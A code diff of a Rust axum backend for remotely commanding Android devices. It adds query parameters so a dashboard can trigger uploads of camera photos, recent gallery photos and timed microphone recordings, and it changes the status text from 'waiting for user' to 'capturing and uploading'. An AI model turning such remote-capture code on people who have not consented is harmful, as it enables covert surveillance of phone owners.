@@ -11,7 +11,7 @@ mod state; //this connects the backend/src/state.rs to main.rs
 use axum::{ //this import tings from auxm for rust web framework
     Json, Router,  //json means backend will recieve JSON from android
                    //Router used to call /register, /devices, /location.
-    extract::{Path, State}, 
+    extract::{Path, Query, State}, 
                    //path used to read values from url(device_id extracted with path)
                    //State used to access shared app state(mainly databse connections)
     http::{HeaderMap, StatusCode},
@@ -1271,15 +1271,23 @@ async fn request_permission_status_command(
     }))
 }
 
+#[derive(Deserialize, Default)]
+struct CapabilityQueryParams {
+    count: Option<i32>,
+    duration_seconds: Option<i64>,
+    camera_facing: Option<String>,
+}
+
 async fn request_capability_upload_command(
     State(state): State<AppState>,
     Path((device_id, capability)): Path<(String, String)>,
+    Query(params): Query<CapabilityQueryParams>,
     headers: HeaderMap,
 ) -> Result<Json<LocateResponse>, (StatusCode, String)> {
     require_dashboard_auth(&headers).map_err(|(status, _, message)| (status, message))?;
     require_command_api_key(&headers)?;
 
-    let (stored_capability, capability_label, camera_facing) = match capability.as_str() {
+    let (stored_capability, capability_label, default_camera_facing) = match capability.as_str() {
         "camera" => ("camera", "Camera photo", Some("back")),
         "camera_front" => ("camera", "Front camera photo", Some("front")),
         "camera_back" => ("camera", "Back camera photo", Some("back")),
@@ -1293,7 +1301,11 @@ async fn request_capability_upload_command(
         _ => return Err((StatusCode::BAD_REQUEST, "Unknown capability".to_string())),
     };
 
-    println!("{capability_label} upload requested for device={device_id}");
+    let count = params.count.unwrap_or(3);
+    let duration_seconds = params.duration_seconds.unwrap_or(5);
+    let camera_facing = params.camera_facing.as_deref().or(default_camera_facing).unwrap_or("");
+
+    println!("{capability_label} upload requested for device={device_id} (count={count}, duration={duration_seconds}s)");
     sqlx::query(
         "
         INSERT INTO device_capability_requests (device_id, capability, requested_at)
@@ -1318,10 +1330,20 @@ async fn request_capability_upload_command(
         serde_json::json!({
             "command": "capability_request",
             "capability": stored_capability,
-            "camera_facing": camera_facing.unwrap_or("")
+            "camera_facing": camera_facing,
+            "count": count.to_string(),
+            "duration_seconds": duration_seconds.to_string()
         }),
     )
     .await?;
+
+    let details_note = if stored_capability == "gallery" {
+        format!(" ({count} latest photos)")
+    } else if stored_capability == "microphone" {
+        format!(" ({duration_seconds}s voice note)")
+    } else {
+        String::new()
+    };
 
     sqlx::query(
         "
@@ -1332,7 +1354,7 @@ async fn request_capability_upload_command(
         ",
     )
     .bind(&device_id)
-    .bind(format!("{capability_label} upload requested; waiting for user"))
+    .bind(format!("{capability_label}{details_note} upload requested; capturing and uploading"))
     .execute(&state.db)
     .await
     .map_err(|_| {
@@ -1343,7 +1365,7 @@ async fn request_capability_upload_command(
     })?;
 
     Ok(Json(LocateResponse {
-        message: format!("{capability_label} upload request sent to {device_id}"),
+        message: format!("{capability_label}{details_note} upload request sent to {device_id}"),
     }))
 }
 
